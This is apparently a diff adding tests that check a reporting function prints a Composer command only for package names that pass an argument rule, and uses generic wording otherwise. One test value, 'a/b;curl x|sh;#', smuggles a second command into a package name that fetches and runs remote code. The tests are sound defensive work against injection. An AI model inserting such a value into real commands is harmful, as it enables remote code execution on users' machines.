@@ -112,4 +112,41 @@ describe("answerText", () => {
       "installs v2.13.0, which clears left-behind, old-promise and 1 of its 2 advisories (",
     );
   });
+
+  describe("prints a command only for a name that passes the argument rule (SPEC §5.6)", () => {
+    const HOSTILE = "a/b;curl x|sh;#";
+    const DASHED = "-a/b";
+    const OPTION = "--no-update";
+
+    it.each([
+      ["E", "`composer update vendor/pkg` installs "],
+      ["partial", "Meanwhile, `composer update vendor/pkg` installs "],
+      ["unreached", "`composer why vendor/pkg` names what requires it"],
+    ])("case %s prints the command of a valid name", (id, phrase) => {
+      const { finding, report } = recorded(id);
+      finding.package = "vendor/pkg";
+
+      expect(answerText(finding, report.run)).toContain(phrase);
+    });
+
+    it.each([
+      ["E", HOSTILE, "An update of this package installs "],
+      ["E", DASHED, "An update of this package installs "],
+      ["E", OPTION, "An update of this package installs "],
+      ["partial", HOSTILE, "Meanwhile, an update of this package installs "],
+      ["partial", DASHED, "Meanwhile, an update of this package installs "],
+      ["partial", OPTION, "Meanwhile, an update of this package installs "],
+      ["unreached", HOSTILE, "`composer why` with this package's name names what requires it"],
+      ["unreached", DASHED, "`composer why` with this package's name names what requires it"],
+      ["unreached", OPTION, "`composer why` with this package's name names what requires it"],
+    ])("case %s words the command of %s", (id, name, phrase) => {
+      const { finding, report } = recorded(id);
+      finding.package = name;
+
+      const answer = answerText(finding, report.run);
+
+      expect(answer).toContain(phrase);
+      expect(answer).not.toContain(name);
+    });
+  });
 });
